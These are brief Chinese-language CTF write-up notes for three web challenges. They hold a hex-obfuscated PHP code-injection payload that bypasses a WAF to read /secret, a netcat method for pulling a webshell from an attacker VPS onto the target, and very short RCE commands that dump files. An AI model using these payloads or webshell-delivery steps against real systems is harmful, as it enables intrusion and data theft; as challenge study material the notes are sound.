# WEB
## easy_calc

题目没有禁止分号，可以执行其他指令。

题目没有禁止反斜杠和双引号，可以使用双引号加转义绕过WAF。

payload: `num1=1&symbol=+&num2=2;include"\x64\x61\x74\x61\x3a\x2f\x2f\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e\x2c\x3c\x3f\x3d\x60\x63\x61\x74\x20\x2f\x73\x65\x63\x72\x65\x74\x60\x3f\x3e"`
- ## easy_cmd
  
  注意到[[netcat]]可以使用`-o`输出文件，可以利用这个方法写入webshell
  
  在VPS上搭建：`cat a.php | nc -lv 3003`
  
  然后在目标上执行命令：`nc -o a.php xxx.xxx.xxx 3003`
  
  即可将`a.php`输入目标，访问即可。
  
  注意：webshell要短
- ## web签到
  
  小于八个字符的[RCE]([[CTF/RCE]])
  
  ```shell
  ls />a
  nl /*>a
  ```